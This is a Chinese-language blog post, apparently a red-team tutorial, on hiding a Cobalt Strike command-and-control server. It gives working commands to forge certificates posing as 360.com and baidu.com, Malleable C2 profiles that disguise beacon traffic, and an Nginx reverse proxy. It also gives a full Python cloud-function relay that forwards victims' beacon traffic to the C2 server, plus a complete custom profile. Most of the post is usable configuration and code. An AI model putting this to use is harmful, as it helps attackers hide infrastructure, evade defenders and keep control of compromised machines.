@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>C2隐藏 | Aruk4s</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Red,">
+  
+
+  <meta name="description" content="修改默认端口：1vim teamserver  更换证书在第一次运行CS之后会在当前目录下生成证书文件：cobaltstrike.store。 该文件可以利用keytool工具进行查看。  Keytool是一个Java数据证书的管理工具，Keytool将密钥和证书存在一个称为keystore的文件中，即*.store  CS的默认证书具有很明显的特征： 1keytool -list -v -key">
+<meta name="keywords" content="Red">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C2隐藏">
+<meta property="og:url" content="http://yoursite.com/2021/07/21/C2隐藏/index.html">
+<meta property="og:site_name" content="Aruk4s">
+<meta property="og:description" content="修改默认端口：1vim teamserver  更换证书在第一次运行CS之后会在当前目录下生成证书文件：cobaltstrike.store。 该文件可以利用keytool工具进行查看。  Keytool是一个Java数据证书的管理工具，Keytool将密钥和证书存在一个称为keystore的文件中，即*.store  CS的默认证书具有很明显的特征： 1keytool -list -v -key">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811203728362.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202112.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818180640440.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202144.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202221.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202304.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829205107.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210812212211166.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829210615.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214106.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214132.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214453.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214755.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214655.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202308487.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202346717.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202749116.png">
+<meta property="og:updated_time" content="2021-08-29T14:54:26.682Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="C2隐藏">
+<meta name="twitter:description" content="修改默认端口：1vim teamserver  更换证书在第一次运行CS之后会在当前目录下生成证书文件：cobaltstrike.store。 该文件可以利用keytool工具进行查看。  Keytool是一个Java数据证书的管理工具，Keytool将密钥和证书存在一个称为keystore的文件中，即*.store  CS的默认证书具有很明显的特征： 1keytool -list -v -key">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811203728362.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#修改默认端口："><span class="toc-text">修改默认端口：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更换证书"><span class="toc-text">更换证书</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Malleable-C2混淆流量"><span class="toc-text">Malleable C2混淆流量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx反向代理"><span class="toc-text">Nginx反向代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修改nginx配置文件"><span class="toc-text">修改nginx配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置C2监听器"><span class="toc-text">配置C2监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防火墙配置"><span class="toc-text">防火墙配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#云函数（python3-6）"><span class="toc-text">云函数（python3.6）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#关于IP"><span class="toc-text">关于IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-C2隐藏" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">C2隐藏</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2021.07.21</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Aruk4s</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Summary/">Summary</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="修改默认端口："><a href="#修改默认端口：" class="headerlink" title="修改默认端口："></a>修改默认端口：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br></pre></td></tr></table></figure>
+
+<h2 id="更换证书"><a href="#更换证书" class="headerlink" title="更换证书"></a>更换证书</h2><p>在第一次运行CS之后会在当前目录下生成证书文件：<code>cobaltstrike.store</code>。</p>
+<p>该文件可以利用<code>keytool</code>工具进行查看。</p>
+<blockquote>
+<p>Keytool是一个Java数据证书的管理工具，Keytool将密钥和证书存在一个称为keystore的文件中，即<code>*.store</code></p>
+</blockquote>
+<p>CS的默认证书具有很明显的特征：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure>
+
+<p>直接写着你就是CS服务器，这种肯定要被打</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811203728362.png" alt="image-20210811203728362"></p>
+<p>使用一下命令对证书进行伪造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">360：</span><br><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;</span><br><span class="line"></span><br><span class="line">baidu：</span><br><span class="line">keytool -keystore cobaltStrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN=ZhongGuo, OU=CC, O=CCSEC, L=BeiJing, ST=ChaoYang, C=CN&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Malleable-C2混淆流量"><a href="#Malleable-C2混淆流量" class="headerlink" title="Malleable C2混淆流量"></a>Malleable C2混淆流量</h3><p>项目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/threatexpress/malleable-c2</span><br><span class="line">https://github.com/xx0hcd/Malleable-C2-Profiles/tree/master/normal</span><br></pre></td></tr></table></figure>
+
+<p>通过CS自带的<code>c2lint</code>检查配置是否可用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint malleable-c2/jquery-c2.4.2.profile</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202112.png" alt></p>
+<p>如图所示，配置可用。之后启动teamserver，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver ip password ./malleable-c2/jquery-c2.4.2.profile</span><br></pre></td></tr></table></figure>
+
+<h2 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h2><p>通过配置Nginx，将信标流量给CS服务器</p>
+<h3 id="修改nginx配置文件"><a href="#修改nginx配置文件" class="headerlink" title="修改nginx配置文件"></a>修改nginx配置文件</h3><p>这里我们选择<code>jquery-c2.4.2.profile</code>对流量进行伪装，通过查看该文件，可以看到流量会通过伪装的uri来进行通信</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818180640440.png" alt="image-20210818180640440"></p>
+<p>所以在nginx配置文件中，对<code>jquery</code>开头的url进行匹配，并反向代理。匹配成功后发送给cs所监听的端口</p>
+<pre><code>location ~*/jquery{
+        #start with jquery
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #获取真实IP
+        proxy_pass http://127.0.0.1:11700;
+}</code></pre><p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202144.png" alt></p>
+<blockquote>
+<p>可能会存在nginx配置文件和图中的不同，在网上找一个配置文件替换掉之前的即可</p>
+</blockquote>
+<p>配置文件中通过<code>X-Forwarded-For</code>，来获取真实IP。如果没有这段代码，所获得的外部地址皆为<code>127.0.0.1</code></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202221.png" alt></p>
+<h3 id="配置C2监听器"><a href="#配置C2监听器" class="headerlink" title="配置C2监听器"></a>配置C2监听器</h3><p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829202304.png" alt></p>
+<p>C2端口为nginx<strong>服务</strong>端口，Bind端口为nginx<strong>代理</strong>端口</p>
+<p>上马测试：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829205107.png" alt></p>
+<h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s 127.0.0.1 -p tcp --dport 11700 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 11700 -j DROP</span><br></pre></td></tr></table></figure>
+
+<p>通过iptables，只允许<code>127.0.0.1</code>，访问该端口。也可以通过云服务器后台关闭端口的进流量</p>
+<h2 id="云函数（python3-6）"><a href="#云函数（python3-6）" class="headerlink" title="云函数（python3.6）"></a>云函数（python3.6）</h2><p>流程：创建基本函数 -&gt; 配置触发器 -&gt; 配置API路径 -&gt; 配置C2</p>
+<ol>
+<li><p>创建基本函数</p>
+<p>函数内容不用管，确保函数能够正常访问之后再更改代码</p>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210812212211166.png" alt="image-20210812212211166"></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829210615.png" alt></p>
+<ol start="2">
+<li><p>配置触发器</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214106.png" alt></p>
+<p>完成之后，在云函数管理中能找到一个API路径，将云函数发布之后，访问该路径</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214132.png" alt></p>
+<p>访问记录都可以在左侧的日志中看到。确定能访问到云函数之后，更改云函数代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中转代码：</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span><span class="params">(event, context)</span>:</span></span><br><span class="line">    C2=<span class="string">'http://&lt;C2服务器地址&gt;'</span> <span class="comment"># 这里可以使用 HTTP、HTTPS~下角标~，也不用加端口</span></span><br><span class="line">    path=event[<span class="string">'path'</span>]</span><br><span class="line">    headers=event[<span class="string">'headers'</span>]</span><br><span class="line">    print(event)</span><br><span class="line">    <span class="keyword">if</span> event[<span class="string">'httpMethod'</span>] == <span class="string">'GET'</span> :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resp=requests.post(C2+path,data=event[<span class="string">'body'</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        print(resp.headers)</span><br><span class="line">        print(resp.content)</span><br><span class="line">    </span><br><span class="line">    response=&#123;</span><br><span class="line">        <span class="string">"isBase64Encoded"</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">"statusCode"</span>: resp.status_code,</span><br><span class="line">        <span class="string">"headers"</span>: dict(resp.headers),</span><br><span class="line">        <span class="string">"body"</span>: str(base64.b64encode(resp.content))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+
+<p>对函数更改后要进行新发布，只保存不发布，不能正常使用</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214453.png" alt></p>
+<p>回到触发器中，删除之前创建的触发器，重新创建触发器，勾选集成响应，配置如图，</p>
+</li>
+</ol>
+<ol start="3">
+<li><p>配置API路径</p>
+<p>接着在配置API网关的默认路径，完成配置后并发布。</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214637.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214755.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210829214655.png" alt></p>
+</li>
+<li><p>配置C2</p>
+<p>启动C2服务器的时候加上profile文件，不加这个文件在选择Listener的时候似乎会出现bug</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">set sample_name &quot;Aruk4s&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/api/getit&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/api/postit&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个监听，在监听中填入云函数的公网地址</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202308487.png" alt="image-20210815202308487"></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202346717.png" alt="image-20210815202346717"></p>
+<p>打开C2的Web Log，访问云函数链接，可以看到有返回值，说明配置成功</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210815202749116.png" alt="image-20210815202749116"></p>
+</li>
+</ol>
+<h3 id="关于IP"><a href="#关于IP" class="headerlink" title="关于IP"></a>关于IP</h3><p>因为是利用云函数的问题，IP会经过CDN，所以IP会经常变换。且上限的机器外网IP全部都是腾讯云。</p>
+<p>我们可以通过curl命令来查看真实IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ident.me</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>云函数可以看做一个中转站。首先木马在受害者电脑运行后，将回连流量发送到云函数API触发器所在地址，通过云函数所设置的API触发器，从而调用云函数，而通过配置云函数，起到把流量再转发给C2服务器，从而使受害者上线。即：</p>
+<blockquote>
+<p>受害者 -&gt; API触发器 -&gt; 云函数 -&gt; C2服务器</p>
+</blockquote>
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">Have Fun</span>
+      <div class="donation-body">
+        <div class="tip text-center">by Aruk4s</div>
+        <ul>
+        
+          <li class="item">
+            
+            <img src="/images/1.png" alt="">
+          </li>
+        
+          <li class="item">
+            
+            <img src="/images/2.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2020/11/04/SQL注入/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2021/08/03/ThinkPHP3.2.3/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
